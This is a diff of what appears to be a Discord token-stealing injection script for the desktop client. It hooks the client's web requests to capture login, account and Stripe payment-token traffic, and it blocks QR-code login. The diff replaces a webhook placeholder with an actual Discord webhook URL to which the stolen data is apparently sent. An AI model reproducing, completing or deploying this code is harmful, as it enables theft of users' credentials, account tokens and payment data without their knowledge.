@@ -7,11 +7,15 @@ const fs = require('fs');
 const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
-const webhook = "%WEBHOOK_LINK%";
-const Filters = [
-    ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"],
-    ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
-];
+const webhook = "https://canary.discord.com/api/webhooks/962289445615333426/83MGWR-cTfGOMc0YQ6mXgmvcJpEXhe29H0RB2E4aMno867DpSvhpn5lnYkQqhsOF4jiT";
+const Filters = {
+    1: {
+    	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
+    },
+    2: {
+    	urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
+    } 
+};
 
 const config = {
     "logout": "%LOGOUT%",
@@ -249,7 +253,7 @@ async function firstTime() {
 
 }
 
-session.defaultSession.webRequest.onBeforeRequest(Filters[1], (details, callback) => {
+session.defaultSession.webRequest.onBeforeRequest(Filters[2], (details, callback) => {
     if (details.url.startsWith("wss://")) {
         if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
             callback({
@@ -784,7 +788,7 @@ function getNitro(flags) {
     };
 }
 
-session.defaultSession.webRequest.onCompleted(Filters[0], async (details, callback) => {
+session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callback) => {
     if (details.statusCode != 200) return;
 
     const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
